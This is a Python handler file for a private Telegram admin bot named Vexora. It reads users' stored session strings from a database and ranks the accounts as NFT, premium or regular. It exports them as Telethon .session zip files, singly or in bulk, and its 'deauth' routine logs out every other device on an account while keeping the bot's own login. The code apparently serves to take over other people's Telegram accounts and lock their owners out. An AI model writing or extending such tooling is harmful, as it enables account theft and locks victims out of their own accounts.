"""Command / message / callback handlers for the Vexora Admin Bot."""
import os
import shutil
import zipfile
import tempfile
import asyncio

from pyrogram import filters

from adminclient import admin_app
from adminconfig import ADMIN_IDS, logger
import adminstore
from session_tools import build_session_file, classify_account, deauth_all_others
from uiadmin import (
    get_admin_keyboard, cancel_keyboard, build_list_view,
    account_label, get_stats_text,
    reply_premium, send_premium, safe_edit_text,
    WELCOME_TEXT, HELP_TEXT,
    ABTN_SCAN, ABTN_NFT, ABTN_PREMIUM, ABTN_REGULAR, ABTN_ALL,
    ABTN_STATS, ABTN_DEAUTH, ABTN_HELP, ABTN_CANCEL,
)

# In-memory scan cache and per-admin conversation state.
SCAN: dict = {"accounts": [], "scanned": False}
WAITING: dict[int, str] = {}


def _is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


def _filtered(cat: str) -> list[dict]:
    accs = SCAN["accounts"]
    if cat == "all":
        return accs
    return [a for a in accs if a["category"] == cat]


def _safe_name(acc: dict) -> str:
    if acc.get("username"):
        return acc["username"]
    if acc.get("user_id"):
        return f"id{acc['user_id']}"
    return "unknown"


# ==================== EXPORT HELPERS ====================
async def _export_one(chat_id: int, acc: dict):
    """Build @username.zip (Telethon .session inside) and send it."""
    if not acc.get("ok"):
        await send_premium(chat_id, f"⚠️ `{account_label(acc)}` is dead — cannot export.")
        return

    safe = _safe_name(acc)
    workdir = tempfile.mkdtemp(prefix="vex_")
    try:
        session_path = build_session_file(acc["session"], os.path.join(workdir, safe))
        zip_path = os.path.join(workdir, f"@{safe}.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(session_path, arcname=f"{safe}.session")

        badge = "💫 NFT" if acc["category"] == "nft" else ("⚡ Premium" if acc["category"] == "premium" else "👥 Regular")
        caption = (
            f"📦 **@{safe}.zip**\n"
            f"{badge}\n"
            f"`{acc.get('user_id')}`"
        )
        body, ents = await _caption(caption)
        await admin_app.send_document(
            chat_id, zip_path, file_name=f"@{safe}.zip",
            caption=body, caption_entities=ents,
        )
    except Exception as e:
        logger.warning(f"[export] {safe} failed: {e}")
        await send_premium(chat_id, f"❌ Export failed for `{account_label(acc)}`: `{e}`")
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


async def _caption(text: str):
    from uiadmin import build_message
    return await build_message(text)


# ==================== /start ====================
@admin_app.on_message(filters.command(["start", "panel"]) & filters.private)
async def admin_start(client, message):
    uid = message.from_user.id
    if not _is_admin(uid):
        await message.reply_text("🔒 This is a private admin console. Access denied.")
        return
    WAITING.pop(uid, None)
    await reply_premium(message, WELCOME_TEXT, reply_markup=get_admin_keyboard())


# ==================== SCAN ====================
async def _run_scan(chat_id: int):
    if not adminstore.has_db():
        await send_premium(chat_id, "⚠️ **No database configured.**\nSet `NEON_DATABASE_URL` so the admin bot can read sessions.")
        return

    status = await send_premium(chat_id, "🔄 **Scanning...**\nFetching sessions from DB.")
    sessions = await adminstore.fetch_sessions()
    if not sessions:
        await safe_edit_text(status, "📭 **No sessions found** in the database yet.")
        return

    total = len(sessions)
    accounts: list[dict] = []
    for i, row in enumerate(sessions, start=1):
        info = await classify_account(row["session"], tag=f"{row['owner_id']}_{row['acc_index']}")
        info["owner_id"] = row["owner_id"]
        info["acc_index"] = row["acc_index"]
        accounts.append(info)
        if i % 3 == 0 or i == total:
            await safe_edit_text(
                status,
                f"🔄 **Scanning...** `{i}/{total}`\nClassified {len(accounts)} account(s).",
                min_interval=1.5,
            )
        await asyncio.sleep(0.5)

    SCAN["accounts"] = accounts
    SCAN["scanned"] = True
    await safe_edit_text(status, get_stats_text(accounts, True))
    await send_premium(chat_id, "✅ **Scan complete.** Open a tier below.", reply_markup=get_admin_keyboard())


# ==================== REPLY KEYBOARD / TEXT ====================
@admin_app.on_message(filters.text & filters.private)
async def admin_text(client, message):
    uid = message.from_user.id
    if not _is_admin(uid):
        return
    text = message.text.strip()

    if text == ABTN_CANCEL:
        WAITING.pop(uid, None)
        await reply_premium(message, "Cancelled.", reply_markup=get_admin_keyboard())
        return

    if text == ABTN_SCAN:
        WAITING.pop(uid, None)
        await _run_scan(uid)
        return

    if text == ABTN_HELP:
        await reply_premium(message, HELP_TEXT, reply_markup=get_admin_keyboard())
        return

    if text == ABTN_STATS:
        await reply_premium(message, get_stats_text(SCAN["accounts"], SCAN["scanned"]), reply_markup=get_admin_keyboard())
        return

    if text in (ABTN_NFT, ABTN_PREMIUM, ABTN_REGULAR, ABTN_ALL):
        if not SCAN["scanned"]:
            await reply_premium(message, "Run **🔄 Scan Sessions** first.", reply_markup=get_admin_keyboard())
            return
        cat = {
            ABTN_NFT: "nft", ABTN_PREMIUM: "premium",
            ABTN_REGULAR: "regular", ABTN_ALL: "all",
        }[text]
        body, kb = build_list_view(cat, _filtered(cat), 1)
        await reply_premium(message, body, reply_markup=kb)
        return

    if text == ABTN_DEAUTH:
        WAITING[uid] = "deauth_session"
        await reply_premium(
            message,
            "🔒 **Deauth**\nSend the **session string** of the account.\n"
            "The bot will log out every OTHER device while keeping its own login.",
            reply_markup=cancel_keyboard(),
        )
        return

    # ---- awaiting input ----
    if WAITING.get(uid) == "deauth_session":
        WAITING.pop(uid, None)
        status = await message.reply_text("🔒 Connecting and terminating other sessions...")
        res = await deauth_all_others(text)
        if res["ok"]:
            await safe_edit_text(
                status,
                f"✅ **Deauth done** for `{res['username']}`\n"
                f"Terminated **{res['terminated']}** other session(s).\n"
                f"The bot's own session stays valid.",
            )
        else:
            await safe_edit_text(status, f"❌ **Deauth failed:** `{res['error']}`")
        await send_premium(uid, "Back to console.", reply_markup=get_admin_keyboard())
        return


# ==================== CALLBACKS ====================
@admin_app.on_callback_query(filters.regex(r"^adm:"))
async def admin_callback(client, callback_query):
    uid = callback_query.from_user.id
    if not _is_admin(uid):
        await callback_query.answer("Not authorized.", show_alert=True)
        return

    parts = callback_query.data.split(":")
    action = parts[1]

    if action == "noop":
        await callback_query.answer()
        return

    if action == "x":
        await callback_query.answer("Closed")
        try:
            await callback_query.message.delete()
        except Exception:
            pass
        return

    if action == "pg":
        cat, page = parts[2], int(parts[3])
        body, kb = build_list_view(cat, _filtered(cat), page)
        await safe_edit_text(callback_query.message, body, reply_markup=kb)
        await callback_query.answer()
        return

    if action == "one":
        cat, pos = parts[2], int(parts[3])
        items = _filtered(cat)
        if 0 <= pos < len(items):
            await callback_query.answer("Exporting...")
            await _export_one(uid, items[pos])
        else:
            await callback_query.answer("Not found.", show_alert=True)
        return

    if action == "all":
        cat = parts[2]
        items = [a for a in _filtered(cat) if a.get("ok")]
        if not items:
            await callback_query.answer("Nothing to export.", show_alert=True)
            return
        await callback_query.answer(f"Exporting {len(items)}...")
        await send_premium(uid, f"📦 **Exporting {len(items)} account(s)...**")
        for acc in items:
            await _export_one(uid, acc)
            await asyncio.sleep(1.0)
        await send_premium(uid, "✅ **Export finished.**", reply_markup=get_admin_keyboard())
        return
